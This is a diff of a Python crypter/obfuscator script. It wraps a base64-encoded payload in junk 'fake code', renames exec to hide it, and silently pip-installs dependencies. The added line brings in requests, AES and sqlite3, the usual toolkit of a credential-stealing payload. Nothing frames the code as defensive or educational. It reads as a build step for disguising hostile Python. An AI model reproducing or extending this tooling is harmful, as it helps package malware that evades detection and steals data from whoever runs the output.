@@ -91,6 +91,6 @@ decompressed_code = zlib.decompress(decrypted_code).decode('utf-8')
 s = base64.b64encode(obfuscated_code.encode('utf-8'))
 
 with open(f'.\\build\{ss}', "wb") as obfu_file:
-    obfu_file.write(f"{all_fake_code};import ctypes;import base64,subprocess\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nb={s}.decode('utf-8')\n{e}(base64.b64decode(b))\n{all_fake_code}".encode("utf-8"))   
+    obfu_file.write(f"{all_fake_code};import ctypes;import base64,subprocess,sqlite3,json\ntry:from cryptography.fernet import Fernet\nexcept:subprocess.run('python -m pip install cryptography', shell=True)\ntry:import requests\nexcept:subprocess.run('python -m pip install requests', shell=True)\ntry:from Crypto.Cipher import AES\nexcept:subprocess.run('python -m pip install Crypto', shell=True)\n{all_fake_code}\n{e} = exec\n{all_fake_code}\nimport concurrent.futures\nb={s}.decode('utf-8')\n{e}(base64.b64decode(b))\n{all_fake_code}".encode("utf-8"))   
 os.remove("encryption_key.txt")
 print(f"The code has been encrypted, Filename: .\\build\{ss}")
